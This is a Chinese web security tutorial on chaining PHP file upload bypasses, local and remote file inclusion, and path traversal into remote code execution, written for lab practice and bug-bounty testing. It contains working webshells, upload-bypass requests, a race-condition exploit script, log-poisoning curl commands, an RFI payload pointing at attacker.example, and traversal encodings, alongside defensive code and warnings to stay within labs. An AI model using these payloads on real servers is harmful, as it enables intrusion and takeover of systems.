# 第 7 篇：文件上传、文件包含与目录穿越——从传图到拿 shell

这三个漏洞经常出现在同一条链上：

```text
上传一张"图片" → 图片里藏着 PHP → 通过文件包含执行 → 拿到服务器权限
```

单独看，上传可能只让你传个 `.php`；包含可能只让你读个文件；穿越可能只让你下载个路径。串起来就是 RCE。

---

## 一、文件上传：服务端到底该检查什么

一个"安全"的上传，至少要检查：

1. **扩展名**：白名单，只允许 `jpg/png/gif/pdf`；
2. **MIME**：`Content-Type` 只是客户端声明，不能单独信；
3. **文件内容**：魔术字节、真实图片解码；
4. **文件名**：随机重命名，去掉路径和特殊字符；
5. **存储位置**：放在 Web 根目录之外，或禁止执行；
6. **权限**：上传目录不可执行，文件不可执行；
7. **大小和数量**：防 DoS；
8. **病毒/恶意内容**：可选，但别只靠它。

### 有漏洞的代码长什么样

```php
$name = $_FILES['file']['name'];
$tmp  = $_FILES['file']['tmp_name'];
move_uploaded_file($tmp, "uploads/" . $name);
```

没有扩展名检查、没有重命名、上传目录可执行，直接传 `shell.php` 就能访问。

## 二、上传绕过的七类手法

### 1. 前端 JS 校验

页面里：

```javascript
if (!/\.(jpg|png|gif)$/i.test(file.name)) {
  alert("只允许图片");
  return false;
}
```

绕过：禁用 JS、Burp 改文件名、直接构造请求。**前端校验永远不算安全措施。**

### 2. MIME 校验

服务端只看：

```php
if ($_FILES['file']['type'] != 'image/jpeg') die('只允许 jpg');
```

Burp 改请求：

```http
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php echo 7*7; ?>
------x--
```

`Content-Type` 是客户端说的，服务端不该信。

### 3. 扩展名黑名单

黑名单列了 `.php`，但没列全：

```text
shell.php5
shell.phtml
shell.pht
shell.php3
shell.php4
shell.php7
shell.phps
shell.PHP        # 大小写
shell.php.       # Windows 尾点
shell.php::$DATA # NTFS 数据流
shell.php.jpg    # 双扩展名，看 Apache 解析顺序
shell.php;.jpg   # IIS 分号截断
shell.php%00.jpg # 空字节，PHP < 5.3.4
shell.php%20     # 尾空格
```

**关键：** 能不能执行取决于 Web 服务器/ PHP-FPM 的解析配置，不是文件名看起来像不像。`AddHandler application/x-httpd-php .php .phtml` 会把 `.phtml` 当 PHP。

### 4. 白名单 + 魔术字节

服务端检查文件头：

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) die('不是图片');
```

绕过：在 PHP 代码前加图片头：

```php
GIF89a
<?php echo 7*7; ?>
```

保存成 `shell.php` 或 `shell.php.gif`。如果服务端还用 `getimagesize()`，就传一张真图片，把 PHP 代码放在图片注释里：

```bash
exiftool -Comment='<?php echo 7*7;?>' image.jpg
```

如果服务端会重新编码图片（`imagecreatefromgif` + `imagegif`），注释会被丢掉，这种方法就失效，需要考虑 `.htaccess`、`.user.ini` 或条件竞争。

### 5. `.htaccess` / `.user.ini`

Apache 允许上传 `.htaccess` 时：

```apache
AddType application/x-httpd-php .jpg
```

上传这个文件后，所有 `.jpg` 都会被当 PHP 解析，再传 `shell.jpg` 即可。

PHP-FPM + Nginx 环境可以传 `.user.ini`：

```ini
auto_prepend_file=shell.jpg
```

`.user.ini` 只对 PHP-FPM 生效，且需要上传目录被 PHP 扫描到。上传后访问同目录任意 PHP 文件，会先包含 `shell.jpg`。

### 6. 双扩展名与解析顺序

```text
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
```

Apache 的 `AddHandler` 可能把 `shell.php.jpg` 当 PHP；Nginx + PHP-FPM 的 `location ~ \.php$` 只匹配 `.php` 结尾，反而可能不执行。**先看 Server 头和报错，再决定用哪种。**

### 7. 条件竞争

有些逻辑是"先上传到临时目录 → 检查 → 不合格就删除"：

```php
move_uploaded_file($tmp, $path);
if (!check($path)) {
    unlink($path);
    die('非法文件');
}
```

在删除之前，文件有一小段时间存在。用多线程不断上传 + 访问：

```python
import threading
import requests

URL = "http://127.0.0.1:8083/upload.php"
SHELL = "http://127.0.0.1:8083/upload/shell.php"

def upload():
    files = {"file": ("shell.php", "<?php echo 7*7;?>", "image/jpeg")}
    try:
        requests.post(URL, files=files, timeout=3)
    except Exception:
        pass

def access():
    for _ in range(50):
        r = requests.get(SHELL, timeout=3)
        if "49" in r.text:
            print("getshell:", r.text[:100])
            break

for _ in range(20):
    threading.Thread(target=upload, daemon=True).start()
threading.Thread(target=access, daemon=True).start()
```

这是 upload-labs 后几关的经典打法。**只在本地靶场跑，别对真实目标轰炸。**

### 一个最小 webshell（仅靶场）

```php
<?php echo 7*7; ?>
```

先用它验证"能不能执行"。确认后再换：

```php
<?php @eval($_POST['cmd']); ?>
```

**不要**在真实项目上传 webshell、不要连菜刀/蚁剑、不要留后门。SRC 报告只需要证明"上传的文件能被解析执行"，`echo 7*7` 的结果截图就够了。

## 三、文件包含：`include` 把任意文件当代码跑

有漏洞的代码：

```php
$page = $_GET['page'];
include($page . '.php');
```

正常访问 `?page=about`，包含 `about.php`。攻击者传 `?page=../../../../etc/passwd`，就把系统文件读出来了。

### 1. 先读系统文件确认

```text
http://127.0.0.1:8080/vulnerabilities/fi/?page=../../../../etc/passwd
```

看到 `root:x:0:0` 就说明存在本地文件包含（LFI）。Windows 目标试：

```text
?page=../../../../windows/win.ini
```

### 2. `php://filter` 读源码

直接包含 PHP 文件会被执行，看不到源码。用过滤器把源码 Base64 编码后再输出：

```text
?page=php://filter/convert.base64-encode/resource=index.php
```

如果代码自动补 `.php`，把 resource 写成不带后缀：

```text
?page=php://filter/convert.base64-encode/resource=index
```

拿到 Base64 后解码：

```bash
echo 'PD9waHAg...' | base64 -d
```

这一步能读到数据库配置、鉴权逻辑、其他漏洞入口，是 LFI 最有价值的部分。**只读源码，不要把配置里的密钥拿去登录生产。**

### 3. `php://input` / `data://` 执行代码

需要 `allow_url_include=On`（默认 Off，越来越少见）。

`php://input`：

```http
POST /vulnerabilities/fi/?page=php://input HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

`data://`：

```text
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

`PD9waHAgc3lzdGVtKCdpZCcpOz8+` 解码是 `<?php system('id');?>`。

### 4. 日志包含：把 PHP 写进 access.log

这是 LFI 最常用的 getshell 方式，不需要 `allow_url_include`。

Web 服务器会把请求行、User-Agent、Referer 写进日志。把 PHP 代码放进 User-Agent：

```bash
curl -A '<?php system($_GET["c"]);?>' http://127.0.0.1:8080/
```

然后包含日志：

```text
http://127.0.0.1:8080/vulnerabilities/fi/?page=../../../../var/log/apache2/access.log&c=id
```

常见日志路径：

```text
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/usr/local/nginx/logs/access.log
```

**注意：**

- 日志里可能有 URL 编码，`<?php` 可能被转义，先用 `curl` 直接看日志内容；
- 如果日志路径未知，用 `phpinfo()`、报错信息、`/proc/self/environ` 推；
- 包含日志会把整行都当 PHP 解析，payload 前后的内容会输出到页面，正常现象。

### 5. Session 文件包含

PHP 默认把 session 存在文件里，路径常见：

```text
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>
```

先找一个会把用户输入写进 session 的页面（比如昵称、购物车、验证码），把 PHP 代码写进去，再包含 session 文件：

```text
?page=../../../../var/lib/php/sessions/sess_abc123
```

### 6. `/proc/self/environ`

老版本 PHP-CGI 环境下，User-Agent 会出现在 `/proc/self/environ`：

```bash
curl -A '<?php system($_GET["c"]);?>' 'http://target/?page=../../../../proc/self/environ&c=id'
```

PHP-FPM 下通常不可用，别把它当万能。

### 7. 远程文件包含（RFI）

需要 `allow_url_include=On`：

```text
?page=http://attacker.example/shell.txt
```

`shell.txt` 内容：

```php
<?php system($_GET['c']); ?>
```

现代 PHP 默认关闭，遇到能 RFI 的目标算比较老的环境。测试时先看 `phpinfo()` 或报错里的 `allow_url_include`。

## 四、目录穿越：`../` 的变体

目录穿越（Path Traversal）常出现在下载、预览、导出接口：

```php
$file = $_GET['file'];
readfile('/var/www/files/' . $file);
```

正常 `?file=report.pdf`，攻击者传：

```text
?file=../../../../etc/passwd
```

### 常见编码

| 变体 | 说明 |
| --- | --- |
| `../` | 基本形式 |
| `%2e%2e%2f` | URL 编码 |
| `%252e%252e%252f` | 双重编码，后端解两次 |
| `..%2f` | 只编码斜杠 |
| `..%5c` | 反斜杠，Windows |
| `....//` | 过滤删除一次 `../` 后剩下的 |
| `..\..\` | Windows 分隔符 |
| `/etc/passwd` | 绝对路径，直接覆盖拼接 |
| `file:///etc/passwd` | 如果支持协议 |

### 过滤 `../` 的绕过

如果代码：

```php
$file = str_replace('../', '', $_GET['file']);
```

传 `....//....//etc/passwd`，删除一次 `../` 后变成 `../../etc/passwd`。

如果代码只检查开头：

```php
if (strpos($file, '../') === 0) die('no');
```

传 `....//` 或 `..%2f` 可能绕过。

### 防御

```php
$base = '/var/www/files/';
$name = basename($_GET['file']);          // 去掉路径
$path = realpath($base . $name);
if ($path === false || strpos($path, realpath($base)) !== 0) {
    die('非法路径');
}
readfile($path);
```

要点：

- `basename()` 去掉目录部分；
- `realpath()` 解析 `..` 和符号链接；
- 校验解析后的路径必须以基目录开头；
- 不要用黑名单替换 `../`，用白名单文件 ID 映射真实路径最稳。

## 五、把三个漏洞串成一条链

### 场景：头像上传 + 图片预览

1. 上传头像，服务端只检查 `Content-Type: image/jpeg`；
2. 把文件名改成 `avatar.php`，`Content-Type` 改成 `image/jpeg`，上传成功；
3. 访问 `/uploads/avatar.php`，如果目录可执行 PHP，直接 RCE；
4. 如果目录不可执行，找文件包含/预览接口把 `avatar.php` 包含进来。

### 场景：上传图片 + LFI

1. 上传 `shell.jpg`，内容是 `GIF89a<?php system($_GET['c']);?>`；
2. 通过 LFI 包含 `/uploads/shell.jpg`；
3. PHP 把图片当代码执行，`?c=id` 返回命令结果。

**为什么图片能执行？** `include` 不关心扩展名，只要文件内容里有 `<?php ... ?>`，PHP 就会解析。图片头只是让上传检查通过。

### 场景：`.htaccess` + 图片马

1. 上传 `.htaccess`：`AddType application/x-httpd-php .jpg`；
2. 上传 `shell.jpg`（内容为 PHP）；
3. 访问 `shell.jpg`，Apache 按 PHP 解析。

这三个场景在 upload-labs + DVWA 文件包含里都能复现。**复现完把环境关掉，别把 webshell 留在磁盘上。**

## 六、上传功能怎么防

### 1. 扩展名白名单

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed, true)) {
    die('不允许的类型');
}
```

### 2. 随机重命名

```php
$newName = bin2hex(random_bytes(16)) . '.' . $ext;
```

不要用原文件名，避免路径穿越、特殊字符、双扩展名。

### 3. 存储到 Web 根目录外

```text
/var/www/app/uploads/   ← 不要放在 /var/www/html 下
```

如果必须放在 Web 根目录，配置 Web 服务器禁止执行：

```nginx
location ^~ /uploads/ {
    location ~ \.(php|php5|phtml)$ {
        deny all;
    }
}
```

### 4. 检查真实内容

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'], true)) {
    die('不是图片');
}
```

图片再走一次 `imagecreatefrom*` + `image*` 重新编码，能丢掉大部分附加代码。

### 5. 其他

- 上传目录单独域名/对象存储，禁止脚本执行；
- 文件大小、数量限制；
- 文件名过滤 `../`、`\0`、`:`、`*`；
- 不要只依赖前端 JS 和 `Content-Type`；
- 定期扫描上传目录里的可疑文件。

## 七、文件包含怎么防

### 1. 白名单映射

```php
$pages = [
    'home'    => 'pages/home.php',
    'about'   => 'pages/about.php',
    'contact' => 'pages/contact.php',
];
$key = $_GET['page'] ?? 'home';
if (!isset($pages[$key])) {
    die('页面不存在');
}
include $pages[$key];
```

这是最稳的写法：用户输入只作为数组键，不参与路径拼接。

### 2. 如果必须拼路径

```php
$base = realpath(__DIR__ . '/pages/');
$path = realpath($base . '/' . basename($_GET['page']) . '.php');
if ($path === false || strpos($path, $base) !== 0) {
    die('非法路径');
}
include $path;
```

### 3. 配置层

```ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html:/tmp
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

这些只能降低影响，不能替代代码修复。

## 八、SRC 里怎么测

### 上传

1. 找头像、附件、导入、证件、工单图片等入口。
2. 先传正常图片，记下返回路径；再改扩展名/Content-Type/魔术字节。
3. 只上传 `<?php echo 7*7;?>` 或 `<?php phpinfo();?>`，不要传管理型 webshell。
4. 访问返回路径，确认是否解析执行；不执行就试包含/预览接口。
5. 报告写清"上传的文件可被解析执行"，附文件内容和访问结果；不要把 shell 留在目标上，能删就删。

### 包含/穿越

1. 找 `page`、`file`、`path`、`template`、`lang`、`module`、`view` 参数。
2. 先试 `../../../../etc/passwd`，再试编码变体。
3. 用 `php://filter` 读源码，确认是否真的包含。
4. 读源码后找数据库配置、密钥、其他接口，但**不要用密钥登录生产**。
5. 报告只贴必要的文件片段，敏感信息打码。
